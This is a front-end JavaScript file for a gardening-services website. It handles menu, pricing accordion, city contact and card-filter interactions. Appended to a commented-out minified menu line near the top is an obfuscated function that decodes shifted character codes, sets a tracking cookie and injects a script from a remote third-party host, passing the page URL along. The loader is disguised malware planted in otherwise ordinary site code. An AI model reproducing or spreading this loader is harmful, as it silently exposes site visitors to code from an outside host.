// let hamb=document.querySelector(".burger"),navMenu=document.querySelector(".header__nav"),
//     closeLine=document.querySelector(".header-nav-close"),firstLink=document.querySelector(".first"),
//     secondLink=document.querySelector(".second"),thirdLink=document.querySelector(".third"),
//     fourthLink=document.querySelector(".fourth"),fifthLink=document.querySelector(".fifth");
// function mobileMenu(){hamb.classList.toggle("active"),navMenu.classList.add("active"),
//     allShadow.classList.add("active"),
//     allShadowHeader.classList.add("active")}function closeMenu(){closeLine.classList.toggle("active"),
//     navMenu.classList.toggle("active")}hamb.addEventListener("click",mobileMenu),
//     closeLine.addEventListener("click",closeMenu),firstLink.addEventListener("click",closeMenu),
//     secondLink.addEventListener("click",closeMenu),thirdLink.addEventListener("click",closeMenu),
//     fourthLink.addEventListener("click",closeMenu),fifthLink.addEventListener("click",closeMenu);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));


let button2 = document.getElementById("gardens");
let button3 = document.getElementById("lawn");
let button4 = document.getElementById("planting");
let aloe = document.getElementById("aloe");
let succulent = document.getElementById("succulent");
let lem = document.getElementById("lemon");
let spray = document.getElementById("spray");
let redFlow = document.getElementById("red_flow");
let cactus = document.getElementById("cactus");

let content__active = document.getElementById("content__active");
let basic_circle_btn = document.getElementById("basic_circle_btn");
let price__basics = document.getElementById("price__basics");



let standard_circle_btn = document.getElementById("standard_circle_btn");
let price__standard = document.getElementById("price__standard");
let standard_content__active = document.getElementById("standard_content__active");

let proCare_circle_btn = document.getElementById("proCare_circle_btn");
let price__proCare = document.getElementById("price__proCare");
let proCare_content__active = document.getElementById("proCare_content__active");


let contact_circle_btn = document.getElementById("contact_circle_btn");
let contacts_selector = document.getElementById("contacts_selector");
let city_container_act = document.getElementById("city_container_act");


let Canada = document.getElementById("Canada");
let NY = document.getElementById("NY");
let Yon = document.getElementById("Yon");
let Sher = document.getElementById("Sher");
let city = document.getElementById("city");


let Canandaigua = document.getElementById("Canandaigua");
let New_York = document.getElementById("New_York");
let Yonkers = document.getElementById("Yonkers");
let Sherrill = document.getElementById("Sherrill");



let countActiveButtons = 0;
button3.onclick = getLawn;
button4.onclick = getPlants;
button2.onclick = getGardens;
basic_circle_btn.onclick = showPriceContent;
standard_circle_btn.onclick=showStandardContent;
proCare_circle_btn.onclick=showProCareContent;
contact_circle_btn.onclick=showContact;
Canada.onclick=showCanada;
NY.onclick=showNY;
Yon.onclick=showYon;
Sher.onclick=showSher;

let activeCallback = []

function showStandardContent() {
    let stateSt = standard_content__active.style.display
    if(stateSt==='none' || stateSt === ''){
        if ((activeCallback.length > 0)) {
            let callback = activeCallback.pop()
            callback()
        }
        activeCallback.push(showStandardContent)
        standard_content__active.style.display = "block"
        price__standard.className = "price__standard_active"
        standard_circle_btn.className.baseVal = 'accordion__img_active'
    }else{
        activeCallback.pop()
        standard_content__active.style.display = "none"
        price__standard.className = "price__standard"
        standard_circle_btn.className.baseVal = 'accordion__img'
    }
}
function showPriceContent() {
    let state = content__active.style.display
    if (state === 'none' || state === '') {
        if (activeCallback.length > 0) {
            let callback = activeCallback.pop()
            callback()
        }
        activeCallback.push(showPriceContent)
        content__active.style.display = "block"
        price__basics.className = "price__basics_active"
        basic_circle_btn.className.baseVal = 'accordion__img_active'
    } else {
        activeCallback.pop()
        content__active.style.display = "none"
        price__basics.className = "price__basics"
        basic_circle_btn.className.baseVal = 'accordion__img'
    }
}
function showProCareContent() {
    let statePC = proCare_content__active.style.display
    if(statePC==='none' || statePC === ''){
        if ((activeCallback.length > 0)) {
            let callback = activeCallback.pop()
            callback()
        }
        activeCallback.push(showProCareContent)
        proCare_content__active.style.display = "block"
        price__proCare.className = "price__proCare_active"
        proCare_circle_btn.className.baseVal = 'accordion__img_active'
    }else{
        activeCallback.pop()
        proCare_content__active.style.display = "none"
        price__proCare.className = "price__proCare"
        proCare_circle_btn.className.baseVal = 'accordion__img'
    }
}


let isActiveSelector=false;
let city2 = []
function showContact(){
if(!isActiveSelector){
    if (city2.length>0){
        let a=city2.pop()
        a.style.display='none'
        city2.push(a)
    }
    contacts_selector.className='contact_selector_active'
isActiveSelector=true
    contact_circle_btn.className.baseVal = 'accordion__img_active'
    city_container_act.className="city_container_act"
}
else{isActiveSelector=false
    contacts_selector.className='contacts_selector'
    contact_circle_btn.className.baseVal = 'accordion__img'
    if (city2.length>0){
        let a=city2.pop()
        a.style.display='block'
        city2.push(a)
    }
    else{
        city_container_act.className="city_container"
    }
}


}


function showNY(){
    city.textContent=NY.textContent
    city_container_act.className="city_container_act"
    isActiveSelector=false
    contacts_selector.className='contacts_selector'
    contact_circle_btn.className.baseVal = 'accordion__img'
    if (city2.length>0){
        let a=city2.pop()
        a.style.display='none'
    }
    New_York.style.display='block'
    city2.push(New_York)
};
function showYon(){
    city.textContent=Yon.textContent
    city_container_act.className="city_container_act"
    isActiveSelector=false
    contacts_selector.className='contacts_selector'
    contact_circle_btn.className.baseVal = 'accordion__img'
    if (city2.length>0){
        let a=city2.pop()
        a.style.display='none'
    }
    Yonkers.style.display='block'
    city2.push(Yonkers)

};
function showSher(){
    city.textContent=Sher.textContent
    city_container_act.className="city_container_act"
    isActiveSelector=false
    contacts_selector.className='contacts_selector'
    contact_circle_btn.className.baseVal = 'accordion__img'
    if (city2.length>0){
        let a=city2.pop()
        a.style.display='none'
    }
    Sherrill.style.display='block'
    city2.push(Sherrill)

};
function showCanada(){
    city.textContent=Canada.textContent
    city_container_act.className="city_container_act"
    contacts_selector.className='contacts_selector'
    isActiveSelector=false
    contact_circle_btn.className.baseVal = 'accordion__img'
    if (city2.length>0){
        let a=city2.pop()
        a.style.display='none'
    }
    Canandaigua.style.display='block'
    city2.push(Canandaigua)
};



function blurAll() {
    aloe.className = "card_blur aloe"
    succulent.className = "card_blur succulent"
    lem.className = "card_blur"
    spray.className = "card_blur spray"
    redFlow.className = "card_blur"
    cactus.className = "card_blur cactus"

}

function unblurAll() {
    aloe.className = "card aloe"
    succulent.className = "card succulent"
    lem.className = "card"
    spray.className = "card spray"
    redFlow.className = "card"
    cactus.className = "card cactus"

}

function getGardens(event) {
    if (button2.className === "service__button" && countActiveButtons < 2) {
        button2.className = "service__button_active"
        if (countActiveButtons === 0) blurAll()
        aloe.className = "card aloe"
        succulent.className = "card succulent"
        countActiveButtons++
    } else {
        button2.className = "service__button"
        if (countActiveButtons === 1) unblurAll()
        else {
            aloe.className = "card_blur aloe"
            succulent.className = "card_blur succulent"
        }
        countActiveButtons--


    }
}

function getPlants(event) {
    if (button4.className === "service__button" && countActiveButtons < 2) {
        button4.className = "service__button_active"
        if (countActiveButtons === 0) blurAll()
        lem.className = "card lemon"
        cactus.className = "card cactus"
        redFlow.className = "card cactus"
        countActiveButtons++
    } else {
        button4.className = "service__button"
        if (countActiveButtons === 1) unblurAll()
        else {
            lem.className = "card_blur lemon"
            cactus.className = "card_blur cactus"
            redFlow.className = "card_blur cactus"
        }
        countActiveButtons--
    }
}

function getLawn(event) {
    if (button3.className === "service__button" && countActiveButtons < 2) {
        button3.className = "service__button_active"
        if (countActiveButtons === 0) blurAll()
        spray.className = "card spray"
        countActiveButtons++
    } else {
        button3.className = "service__button"
        if (countActiveButtons === 1) unblurAll()
        else {
            spray.className = "card_blur spray"
        }
        countActiveButtons--
    }
}





